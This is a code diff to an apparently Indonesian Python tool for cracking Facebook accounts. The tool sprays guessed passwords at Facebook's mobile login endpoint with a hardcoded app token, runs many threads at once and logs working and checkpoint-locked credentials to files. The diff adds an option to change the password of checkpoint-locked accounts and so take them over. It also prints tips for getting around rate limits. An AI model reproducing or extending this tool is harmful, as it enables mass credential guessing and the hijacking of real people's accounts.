@@ -29,7 +29,8 @@ from data import cp_detect as cpp
 
 ok,cp,loop = 0,0,0
 cot = ""
-nampung = []
+nampung, opsi = [], []
+ub, pwBaru = [], []
 
 class Main(object):
 	
@@ -52,12 +53,37 @@ _________  ________  __      __________
 		"""
 		return banner
 	def cpdetect(self):
-		__data=input("\n[?] Masukan nama file: ")
+		__data=input("[?] Masukan nama file: ")
 		try:
 			_file=open("results/"+__data,"r").readlines()
 		except FileNotFoundError:
 			exit("[!] File tidak ditemukan")
-		cpp.Eksekusi("https://mbasic.facebook.com",_file)
+		ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
+		if ww in ("y","ya"):
+			pwBar=input("[+] Masukan pw baru: ")
+			ub.append("y")
+			if len(pwBar) <= 5:
+				exit("Password harus lebih dari 6 character!")
+			else:
+				pwBaru.append(pwBar)
+		cpp.Eksekusi("https://mbasic.facebook.com",_file,"file","".join(pwBaru),"".join(ub))
+	def proses(self):
+		print("")
+		op = input("[?] Munculkan opsi [y/t]: ")
+		if op in ("y","Y"):
+			ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
+			if ww in ("y","ya"):
+				pwBar=input("[+] Masukan pw baru: ")
+				ub.append("y")
+				if len(pwBar) <= 5:
+					exit("Password harus lebih dari 6 character!")
+				else:
+					pwBaru.append(pwBar)
+				return "y"
+			else:
+				print("> Skipped")
+			opsi.append("y")
+		print("\n[!] Akun hasik ok di save di ok.txt\n[!] Akun hasil cp di save di cp.txt\n")
 
 class Data(Main):
 	
@@ -98,7 +124,8 @@ class Data(Main):
 		if pasw in ("m","M","g","G"):
 			print("[!] Pisahkan password menggunakan koma contoh (sayang,bangsad)")
 			tam = input("[+] Masukan password: ").split(",")
-		print("\n * Crack dimulai... CTRL + Z untuk stop! \n")
+		self.proses()
+		print(" * Crack dimulai... CTRL + Z untuk stop! \n")
 		with Bool(max_workers=35) as kirim:
 			for __data in data:
 				nama,id = __data.split("<=>")
@@ -147,7 +174,7 @@ class Crack(Main):
 			pw=pw.lower()
 			response = session.get(url+"/method/auth.login",params={'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'id_ID', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'})
 			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response.text:
-				print("[!] Opss! Terkena spam... nyalakan mode pesawat selama 2 detik!")
+				print("\r[!] Opss! Terkena spam... nyalakan mode pesawat selama 2 detik!\n",end="")
 				continue
 			if 'access_token' in response.text and 'EAAA' in response.text:
 				ok+=1
@@ -156,12 +183,16 @@ class Crack(Main):
 				break
 			elif 'www.facebook.com' in response.json()['error_msg']:
 				cp+=1
-				print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
+				_file = user+"|"+pw
+				if "y" in opsi:
+					cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
+				else:
+					print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
 				open("results/cp.txt","a").write(user+"|"+pw+"\n")
 				break
 			else:
 				continue
-		print(f"\r[=] Crack: {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)}	",end="")
+		print(f"\r[=] {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	",end="")
 		
 	def mbasic(self,url,user,pwList):
 		global loop, ok, cp, cot
@@ -213,16 +244,20 @@ class Crack(Main):
 					print(f"\r\33[31;1m[CP] {user} | {pw} -> A2F ON								\n\33[37;1m",end="")
 				else:
 					cp+=1
-					print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
+					_file = user+"|"+pw
+					if "y" in opsi:
+						cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
+					else:
+						print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
 					open("results/cp.txt","a").write(user+"|"+pw+"\n")
 					break
 			else:
 				if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
-					print("\33[31;1m[!] hidupkan mode pesawat selama 2 detik \33[37;1m")
+					print("\r\33[31;1m[!] hidupkan mode pesawat selama 2 detik \33[37;1m\n",end="")
 					continue
 				else:
 					pass
-			print(f"\r[=] Crack: {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)}	",end="")
+			print(f"\r[=] {str(loop)}/{str(len(nampung))} Ok/Cp: {str(ok)}/{str(cp)} CRACK: {'{:.1%}'.format(loop/float(len(nampung)))}	",end="")
 	
 def login():
 	os.system("clear")
